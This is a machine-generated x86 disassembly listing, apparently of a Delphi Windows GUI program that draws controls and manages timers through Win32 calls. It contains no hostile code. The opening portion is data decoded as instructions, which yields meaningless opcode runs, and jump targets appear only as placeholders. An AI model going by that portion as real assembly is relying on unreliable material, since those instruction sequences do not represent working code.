add [ eax ] al
nop
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub al 0x0
pop es
push esi
imul esi [ ebx + 0x69 ] 0x30656c62
sub al [ eax + eax - 0x40 ]
add [ eax ] al
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002d ] al
outsb
inc ebx
popad
outsb
push edx
jae r-xdata
jo r-xdata
adc [ eax ] al
0xf8ff0000 0x4470
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
popad
jb r-xdata
push cs
je r-xdata
inc esi
add [ fs : eax ] dl
inc eax
add [ edx ] bl
add bh bh
dec eax
jno r-xdata
outsb
je r-xdata
push eax
popad
jb r-xdata
add [ edx ] cl
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x4f0a0033 ] al
outsb
js r-xdata
add [ eax ] al
pop eax
mov [ ecx ] eax
and [ ecx ] al
add bh bh
and [ ecx ] al
add bh bh
and [ eax + 0x44 ] dl
add [ eax - 0x80000000 ] al
add [ cs : edi ] al
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
enter 0x0 0xff
enter 0x0 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ ebx ] dl
dec edi
outsb
inc ebx
outsd
outsb
jae r-xdata
movsb [ edi ] [ esi ]
add [ eax ] eax
outsb
jne r-xdata
jo r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
mov al 0x70
inc esp
add [ ecx ] al
and al 0x0
or edx [ eax + 0x61 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
fld [ eax + eax - 0x40 ]
fld [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
test eax 0x14ff0001
fld [ eax + eax + 0x1 ]
add [ eax ] 0x0
add [ eax + 0x4f090037 ] al
inc esp
jb r-xdata
push eax
outsd
jo r-xdata
or cl [ edi + 0x6e ]
jb r-xdata
adc [ eax ] al
cdq
add [ eax ] al
call esp
jo r-xdata
jb r-xdata
push eax
popad
pushad
inc ebp
add [ eax + eax ] bh
inc edi
je r-xdata
pop eax
mov [ ecx ] eax
rol [ ecx ] 0x0
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
add [ eax ] al
jo r-xdata
or cl [ edi + 0x6e ]
jb r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0032 ] al
outsb
push cs
dec edi
outsb
inc ebx
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
fld [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sub eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax + esi * 2 + 0x44 ] bl
add al 0x25
inc esp
add al ah
add [ eax ] al
jmp eax
imul esi [ ebp + 0x49 ] 0x46f666e
and eax 0xd00044
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
dec ebp
outsd
jne r-xdata
dec edi
outsb
jb r-xdata
jb r-xdata
inc esp
inc esp
jb r-xdata
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
outsd
outsb
je r-xdata
daa
inc esp
add [ eax - 0x4f00ffff ] dh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0031 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
add [ eax + 0x4f070038 ] al
add [ eax ] al
dec edi
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0035 ] al
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe94239a6
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ecx ] eax
sub [ ecx ] al
add bh bh
adc [ eax ] al
push edi
add [ eax ] al
jmp [ esi + ebp * 2 - 0x6fffffbc ]
sub [ eax + eax ] eax
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003f ] al
outsb
push ebx
inc esp
outsd
ja r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax [ eax ]
or ecx [ edi + 0x6e ]
mov [ ecx ] eax
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
push es
dec edi
outsb
inc ebp
js r-xdata
jo r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
clc
jb r-xdata
jl r-xdata
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f0a0034 ] al
outsb
inc esp
jb r-xdata
sub [ eax + eax - 0x48 ] al
add [ eax ] eax
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
or cl [ edi + 0x6e ]
daa
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x68 ] bp
daa
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_427328
inc esp
outsd
arpl [ ebx + 0x50 ] bp
and eax 0xe00044
add bh bh
loopne r-xdata
inc esp
add al bl
add [ eax ] al
daa
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0040 ] al
dec ebp
outsd
jbe r-xdata
outsb
inc ebp
outsb
inc esp
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aaa
add [ ecx ] cl
dec edi
sub [ eax + eax - 0x30 ] eax
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d003a ] al
outsb
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
jb r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0900
dec ebp
outsd
jne r-xdata
je r-xdata
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_427ab0
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_427328
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_427ab0
pop ebx
mov esp ebp
pop ebp
retn
inc ebp
in al 0x8b
inc ebp
clc
inc esp
jb r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
sub [ eax + eax - 0x10 ] al
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080041 ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x55 ] bp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
push ebp
jo r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
fmul [ ebx + 0x4589f445 ]
fmul [ ebx - 0x1fba76fd ]
in al dx
outsb
push ebx
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
inc eax
add [ ebx ] cl
dec edi
mov [ ecx ] eax
clc
add [ eax ] al
sub_433b9c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov ebx [ ebp + 0x8 ]
mov ebx [ ebx - 0x4 ]
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_427328
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_427ab0
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x10 ]
call sub_427328
dec [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx 0x2
call sub_427ab0
pop ebx
mov esp ebp
pop ebp
retn
sub_433c60
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_427434
mov eax [ ebp - 0x4 ]
dec [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
dec [ eax + 0x8 ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0x4 ]
inc [ eax + 0xc ]
mov eax [ ebp - 0x4 ]
inc [ eax + 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn 0x8
dec ebx
push ebp
call sub_433b9c
pop ecx
push 0xffffffff
push 0xffffffff
mov eax [ ebp - 0x4 ]
push eax
call InflateRect
test ebx ebx
jg r-xdata
sub_433cc0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44e9cc
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x69
mov eax esi
call sub_446740
mov edx 0x69
mov eax esi
call sub_446764
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_433d20
push ebx
push esi
mov ebx eax
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x160 ]
call sub_427c70
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
mov edx [ ebx + 0x70 ]
call sub_427608
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x16a ] 0x0
je r-xdata
mov esi [ ebx + 0x160 ]
mov dl 0x1
mov eax [ esi + 0x10 ]
call sub_427404
mov dl 0x1
mov eax [ esi + 0x14 ]
call sub_427724
mov eax [ ebx + 0x48 ]
push eax
mov eax [ ebx + 0x4c ]
push eax
xor ecx ecx
xor edx edx
mov eax esi
call sub_427ae8
pop esi
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x16c ]
call [ ebx + 0x168 ]
sub_433d94
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44e9cc
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov [ esi + 0x168 ] 0x0
mov [ esi + 0x169 ] 0x0
mov edx 0x32
mov eax esi
call sub_446740
mov edx 0x32
mov eax esi
call sub_446764
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_433e38
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x160 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ esi + 0x10 ]
call sub_427328
lea ecx [ ebp - 0x20 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx ]
call sub_419ff0
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx ]
call sub_419ff0
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x30 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_419ff0
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x2
mov eax esi
call sub_427ab0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ esi + 0x10 ]
call sub_427328
lea ecx [ ebp - 0x20 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_419ff0
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_419ff0
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0xc ] eax
lea ecx [ ebp - 0x30 ]
mov edx [ ebx + 0xc ]
mov eax [ ebx ]
call sub_419ff0
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x2c ]
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x18 ]
mov ecx 0x2
mov eax esi
call sub_427ab0
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_433f28
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov edx [ ebp + 0x10 ]
mov edx [ edx - 0x4 ]
mov ebx [ edx + 0x160 ]
mov edx eax
mov eax [ ebx + 0x10 ]
call sub_427328
mov ecx edi
mov edx esi
mov eax ebx
call sub_427a84
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_427a24
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_433f68
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x160 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx 0x1
mov eax [ ebx + 0x10 ]
call sub_427434
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x168 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x169 ] 0x6
jne r-xdata
mov [ ebp - 0x8 ] 0xff000014
mov [ ebp - 0xc ] 0xff000010
mov [ ebp - 0x8 ] 0xff000010
mov [ ebp - 0xc ] 0xff000014
jmp r-xdata
xor edx edx
mov eax [ ebx + 0x10 ]
call sub_427404
mov dl 0x4
mov eax [ ebx + 0x10 ]
call sub_4273e8
xor edx edx
mov eax [ ebx + 0x10 ]
call sub_427328
xor edx edx
mov eax [ ebx + 0x14 ]
call sub_427724
mov dl 0x2
mov eax [ ebx + 0x10 ]
call sub_427404
mov dl 0xe
mov eax [ ebx + 0x10 ]
call sub_4273e8
mov edx 0xffd8ce
mov eax [ ebx + 0x10 ]
call sub_427328
mov dl 0x1
mov eax [ ebx + 0x14 ]
call sub_427724
mov eax [ ebp - 0x4 ]
call sub_446988
push eax
mov eax [ ebp - 0x4 ]
call sub_4469cc
push eax
xor ecx ecx
xor edx edx
mov eax ebx
call sub_427ae8
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
jmp [ eax * 4 + jump_table_43405a ]
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x169 ]
cmp eax 0x5
ja r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
dec ecx
xor edx edx
xor eax eax
call sub_41a018
lea eax [ ebp - 0x1c ]
call sub_433e38
pop ecx
jmp r-xdata
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
dec ecx
mov edx 0x1
mov eax 0x1
call sub_41a018
lea eax [ ebp - 0x1c ]
call sub_433e38
pop ecx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
sub eax 0x2
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x48 ]
sub ecx 0x2
xor edx edx
xor eax eax
call sub_41a018
lea eax [ ebp - 0x1c ]
call sub_433e38
pop ecx
jmp r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x0
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_433f28
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
push 0x1
mov ecx 0x1
xor edx edx
mov eax [ ebp - 0xc ]
call sub_433f28
pop ecx
jmp r-xdata
push ebp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
sub eax 0x2
push eax
mov ecx eax
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_433f28
pop ecx
push ebp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
push edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
dec eax
push eax
mov ecx eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_433f28
pop ecx
jmp r-xdata
push ebp
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_433f28
pop ecx
push ebp
push 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
xor ecx ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_433f28
pop ecx
jmp r-xdata
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
sub eax 0x2
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_433f28
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
dec eax
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
push edx
mov edx eax
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_433f28
pop ecx
sub_4341f0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_423aa8
mov [ esi + 0x40 ] 0x1
mov [ esi + 0x30 ] 0x3e8
push esi
push sub_434278
call sub_424bf4
mov [ esi + 0x34 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_434240
push ebx
push esi
call sub_40375c
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_4342ec
mov eax [ esi + 0x34 ]
call sub_424ca8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_423af4
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403744
sub_434278
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_4342b2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_40358c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4342ec
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_43436b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_434372
lea eax [ ebp - 0x4 ]
call sub_404120
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_406030
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bc44
call sub_403b5c
sub_4343c4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44f408
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
call sub_43a564
call sub_43a644
test al al
je r-xdata
add esp 0xfffffff0
call sub_4036f4
mov edx 0xb9
mov eax esi
call sub_446740
mov edx 0x29
mov eax esi
call sub_446764
mov [ esi + 0x220 ] 0x2
mov dl 0x2
mov eax esi
call sub_434814
mov edx 0x1
mov eax esi
call sub_434830
mov [ esi + 0x21c ] 0x0
mov edx 0xff00000f
mov eax esi
call sub_447124
mov [ esi + 0x21d ] 0x1
mov dl 0x1
mov eax esi
call sub_44da38
mov eax esi
test bl bl
je r-xdata
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov edx [ r-xdata ]
not edx
and edx eax
mov [ esi + 0x50 ] edx
mov eax esi
pop esi
pop ebx
retn
call sub_40374c
pop [ fs : 0x0 ]
add esp 0xc
sub_434488
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44a5f8
xor eax eax
mov al [ ebx + 0x21c ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_4344f8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44cd84
pop esi
pop ebx
retn
cmp [ ebx + 0x21c ] 0x1
jne r-xdata
mov eax ebx
call sub_44ad0c
sub_434538
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_434628
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x21d ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_446f84
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov edx edi
mov eax ebx
call sub_44bc48
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43462f
lea eax [ ebp - 0x14 ]
call sub_404120
retn
mov esi [ ebx + 0x218 ]
cmp [ ebx + 0x211 ] 0x0
je r-xdata
cmp [ ebx + 0x212 ] 0x0
je r-xdata
add esi [ ebx + 0x214 ]
test esi esi
jle r-xdata
add esi [ ebx + 0x214 ]
mov eax [ ebx + 0x48 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ edi + 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
sub eax esi
dec eax
mov [ ebp - 0x10 ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_44d7a4
push eax
call InvalidateRect
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
sub eax esi
dec eax
mov [ ebp - 0xc ] eax
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_44d7a4
push eax
call InvalidateRect
sub_434638
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000014
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] 0xff000010
cmp al 0x1
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] 0xff000010
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov [ eax - 0x8 ] 0xff000014
sub_434670
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4347d2
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov al [ ebx + 0x212 ]
test al al
je r-xdata
mov eax [ ebx + 0x70 ]
push eax
mov edx [ ebx + 0x218 ]
push edx
lea edx [ ebp - 0x18 ]
mov ecx eax
mov eax [ ebx + 0x208 ]
call sub_433c60
mov al [ ebx + 0x211 ]
test al al
je r-xdata
push ebp
call sub_434638
pop ecx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebx + 0x214 ]
push eax
